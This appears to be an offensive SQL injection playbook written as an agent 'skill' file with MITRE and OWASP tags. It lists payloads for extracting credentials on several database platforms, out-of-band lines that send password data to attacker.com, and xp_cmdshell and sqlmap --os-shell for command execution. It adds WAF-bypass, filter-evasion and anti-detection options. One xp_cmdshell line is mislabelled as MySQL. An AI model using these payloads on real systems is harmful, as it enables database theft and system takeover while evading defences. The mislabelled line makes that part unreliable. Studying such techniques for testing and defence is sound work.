---
skill: SQL Injection (T1190)
mitre_attack_id: T1190
owasp_mapping: [A01, A03]
difficulty: advanced
tags: [sql-injection, database, web, exploitation]
---
## Summary
SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application's database layer by inserting malicious SQL statements into input fields. It remains one of the most critical web application vulnerabilities, enabling attackers to read, modify, or delete database contents, execute administrative operations, and in some cases issue commands to the underlying operating system. This playbook covers detection, exploitation, WAF bypass, and mitigation bypass techniques across major database platforms.

## Steps

### 1. Detection & Reconnaissance
- Identify injection points: URL parameters, POST bodies, HTTP headers (User-Agent, Cookie, X-Forwarded-For), JSON/XML API payloads.
- Inject non-malicious test characters: single quote (`'`), double quote (`"`), backslash (`\`), semicolon (`;`), double dash (`--`), comment hashes (`#`, `/*`).
- Observe responses for SQL errors (e.g., `You have an error in your SQL syntax`, `Unclosed quotation mark`, `ORA-00933`).
- Use timing-based detection: `' OR SLEEP(5)--` or `' WAITFOR DELAY '0:0:5'--` to identify blind SQLi via response delay.
- Use conditional responses: `' OR 1=1--` vs `' OR 1=2--` to detect boolean-based blind injection.

### 2. In-band SQLi (Error-based & Union-based)
- Error-based: Leverage database error messages to extract information. Use functions like `CONVERT`, `CAST`, `EXTRACTVALUE`, `UPDATEXML` (MySQL), `GROUP BY HAVING` (MSSQL), `ctxsys.drithsx` (Oracle).
- Union-based: Determine column count with `ORDER BY N--` or `UNION SELECT NULL, NULL...--`. Match column data types. Extract data: `' UNION SELECT username, password FROM users--`.
- Database fingerprinting: Use version functions (`@@version`, `VERSION()`, `BANNER FROM v$version`).

### 3. Blind SQLi (Boolean & Time-based)
- Boolean-based: Inject conditions that return different page content. Extract characters one at a time: `' OR SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a`.
- Time-based: Use sleep functions (`SLEEP(5)` in MySQL, `WAITFOR DELAY '0:0:5'` in MSSQL, `DBMS_LOCK.SLEEP(5)` in Oracle) to infer true/false conditions.
- Use binary search for efficient character extraction (typically 7-8 requests per character instead of 95).

### 4. Out-of-band SQLi
- Use when direct response channels are blocked but database can make network calls.
- MySQL: `SELECT * FROM users WHERE id=1; EXEC xp_cmdshell('nslookup attacker.com');`.
- Oracle: `UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT password FROM users WHERE rownum=1))`.
- MSSQL: `xp_cmdshell`, `xp_dirtree`, `OPENROWSET` for DNS/HTTP exfiltration.
- Set up a listener (Burp Collaborator, interactsh, or custom DNS server) to capture outbound requests.

### 5. Database-specific Payloads
- **MySQL**: `' OR 1=1--`, `' UNION SELECT @@version, user(), database()--`, `INTO OUTFILE` for file write, `LOAD_FILE()` for file read. Comments: `-- `, `#`, `/*!*/`.
- **PostgreSQL**: `' UNION SELECT version(), current_user, current_database--`, `CAST` for error-based, `PG_SLEEP(5)` for time-based. Array functions for stacked queries.
- **MSSQL**: `' WAITFOR DELAY '0:0:5'--`, `xp_cmdshell` for RCE, `OPENQUERY` for linked servers, `EXEC sp_configure` to enable advanced options.
- **Oracle**: `' UNION SELECT banner FROM v$version--`, `TO_TIMESTAMP` for error-based, `UTL_HTTP` for out-of-band, `CTXSYS.DRITHSX.SN` for error-based extraction.

### 6. WAF Bypass Techniques
- Case variation: `SeLeCt`, `UnIoN`, `SeLeCt`.
- Comment injection: `SEL/**/ECT`, `UN/**/ION`, inline comments `/*!UNION*/`.
- URL encoding: Double encoding (`%253D` for `=`), unicode encoding, hex encoding.
- HTTP parameter pollution: `?id=1&id=2` or `?id=1&id=1' UNION SELECT--`.
- HTTP method alteration: Switch between GET, POST, PUT, PATCH.
- Request header manipulation: Add `X-Forwarded-For: 127.0.0.1`, `Content-Type: application/x-www-form-urlencoded` vs `application/json`.
- Alternative whitespace: `%09`, `%0a`, `%0c`, `%0d`, `%a0` (non-breaking space).
- Buffer overflow attempts: Send excessively long inputs to crash WAF regex parsing.
- Using `IFNULL`/`COALESCE` as alternatives for specific DB functions.

### 7. sqlmap Automation
- Basic: `sqlmap -u "http://target.com/page?id=1" --batch --level=3 --risk=2`.
- With cookie: `sqlmap -u "http://target.com/page?id=1" --cookie="session=abc"`.
- Request file: `sqlmap -r request.txt --batch`.
- DB enumeration: `--dbs`, `--tables -D dbname`, `--dump -T tablename`.
- WAF bypass: `--tamper=space2comment,randomcase,between`, `--skip-waf`.
- Anti-detection: `--random-agent`, `--delay=2`, `--safe-url`, `--safe-freq`.
- Advanced: `--os-shell`, `--sqlmap-shell`, `--technique=BEUSTQ`.

### 8. Mitigation Bypass
- Filtered keywords: Use hex encoding (`0x...`), char functions (`CHAR(97,100,109,105,110)`), binary representation.
- Input validation bypass: Unicode normalization attacks, null byte injection (`%00'`), multibyte character truncation.
- Stored procedure bypass: Use `sp_executesql` in MSSQL, `EXECUTE IMMEDIATE` in Oracle for dynamic SQL in stored procedures.
- Second-order SQLi: Inject payloads into stored data that execute when retrieved later (e.g., registration form with malicious username).

## Verification
- Confirm data extraction accuracy by cross-referencing with at least two different extraction methods (e.g., union + blind).
- Validate that extracted data matches expected format (e.g., password hashes match known hash patterns, user IDs are sequential).
- Test that the same vulnerability is reproducible with two different payload patterns.
- For time-based blind, verify response delay is consistent and not a network anomaly.
- Run a second tool (e.g., both manual payloads and sqlmap) to confirm findings.

## References
- OWASP SQL Injection Guide: https://owasp.org/www-community/attacks/SQL_Injection
- OWASP SQLi Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- sqlmap User Manual: https://github.com/sqlmapproject/sqlmap/wiki
- PortSwigger SQLi Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- MITRE ATT&CK T1190: https://attack.mitre.org/techniques/T1190/
